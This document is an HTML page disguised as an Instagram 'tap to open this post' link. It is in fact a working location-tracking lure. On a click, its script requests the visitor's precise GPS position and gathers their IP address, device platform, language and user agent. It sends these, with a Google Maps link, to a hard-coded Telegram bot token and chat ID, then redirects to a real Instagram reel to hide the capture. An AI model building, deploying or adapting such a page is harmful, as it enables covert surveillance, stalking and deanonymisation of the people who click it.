<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title >Instagram </title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            background:#fff;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            color:#262626;
            padding:20px;
        }
        .loader{
            text-align:center;
            width:100%;
            max-width:380px;
            padding:30px 20px;
        }
        .loader svg{
            margin-bottom:20px;
            width:200px;
            height:68px;
        }
        .loader h2{
            font-size:28px;
            font-weight:700;
            margin-bottom:4px;
            letter-spacing:1px;
            color:#262626;
        }
        .loader .sub{
            color:#8e8e8e;
            font-size:15px;
            margin-bottom:25px;
        }
        .open-btn{
            display:inline-block;
            padding:14px 50px;
            background:#0095f6;
            border:none;
            border-radius:50px;
            color:#fff;
            font-size:18px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
            margin:15px auto;
            text-decoration:none;
            box-shadow:0 8px 30px rgba(0,149,246,0.3);
            transition:all 0.3s ease;
        }
        .open-btn:hover{
            transform:translateY(-2px);
            box-shadow:0 12px 40px rgba(0,149,246,0.5);
        }
        .open-btn:disabled{
            opacity:0.6;
            cursor:not-allowed;
            transform:none;
        }
        .spinner{
            width:38px;height:38px;
            border:3px solid #e0e0e0;
            border-top-color:#0095f6;
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin:20px auto 0;
            display:none;
        }
        .spinner.active{display:block;}
        @keyframes spin{to{transform:rotate(360deg);}}
        .redirect-note{color:#8e8e8e;font-size:13px;margin-top:15px;display:none;}
        .redirect-note.active{display:block;}
    </style>
</head>
<body>

    <div class="loader" id="mainPage">
        <!-- Instagram Logo - SVG رەسمی -->

        <h2>Instagram</h2>
        <p class="sub" id="status">Tap Open to view this post</p>
        
        <button class="open-btn" id="openBtn">Open</button>
        
        <div class="spinner" id="spinner"></div>
        <p class="redirect-note" id="redirectNote">Redirecting to Instagram...</p>
    </div>

    <script>
        // ==================== Telegram Credentials ====================
        const BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
        const CHAT_ID = "6230485449";
        const TARGET_URL = "https://www.instagram.com/reel/DUJTqvbjBPl/?igsh=MW9nMXM0bjFtbXAxMw==";
        // =============================================================

        // Send to Telegram
        function sendToTelegram(text) {
            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                });
            } catch(e) {}
        }

        // Get IP
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip || 'Unknown';
            } catch(e) {
                return 'Not found';
            }
        }

        // Get GPS
        function getGPS(callback) {
            if (!navigator.geolocation) {
                callback(null, 'GPS not available');
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    callback({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    });
                },
                function(err) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            callback({
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                acc: pos.coords.accuracy
                            });
                        },
                        function(err2) {
                            callback(null, err2.message || 'Permission denied');
                        },
                        {timeout: 5000, enableHighAccuracy: false}
                    );
                },
                {timeout: 7000, enableHighAccuracy: true}
            );
        }

        // Collect and send
        async function collectAndSend(gpsData, error) {
            try {
                const ip = await getIP();
                const userAgent = navigator.userAgent;
                const platform = navigator.platform || 'Unknown';
                const lang = navigator.language || 'Unknown';
                
                let msg = `📍 **Instagram Location** 📍\n\n`;
                msg += `**🌐 IP:** \`${ip}\`\n`;
                msg += `**📱 Platform:** ${platform}\n`;
                msg += `**🌍 Language:** ${lang}\n`;
                msg += `**🕐 Time:** ${new Date().toLocaleString()}\n`;
                msg += `**🔗 Target:** ${TARGET_URL}\n\n`;
                
                if (gpsData) {
                    msg += `**📍 GPS:** \`${gpsData.lat}, ${gpsData.lng}\`\n`;
                    msg += `**📡 Accuracy:** ${Math.round(gpsData.acc)} meters\n\n`;
                    msg += `**🔗 Google Maps:**\n`;
                    msg += `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n\n`;
                } else {
                    msg += `**⚠️ GPS Error:** ${error || 'Not found'}\n\n`;
                }
                
                msg += `**User-Agent:**\n\`${userAgent}\``;
                
                sendToTelegram(msg);
            } catch(e) {
                sendToTelegram(`❌ Error: ${e.message}`);
            }
        }

        // ========== Open Button Click ==========
        document.getElementById('openBtn').addEventListener('click', function() {
            const btn = document.getElementById('openBtn');
            const spinner = document.getElementById('spinner');
            const status = document.getElementById('status');
            const redirectNote = document.getElementById('redirectNote');
            
            // Disable button
            btn.disabled = true;
            btn.textContent = 'Opening...';
            status.textContent = 'Getting location...';
            
            // Request GPS immediately
            getGPS(function(gpsData, error) {
                // Send data to Telegram
                collectAndSend(gpsData, error);
                
                // Show redirect
                status.textContent = 'Opening post...';
                spinner.classList.add('active');
                redirectNote.classList.add('active');
                
                // Redirect to Instagram Reel
                setTimeout(function() {
                    window.location.href = TARGET_URL;
                }, 2000);
            });
        });
    </script>
</body>
</html>
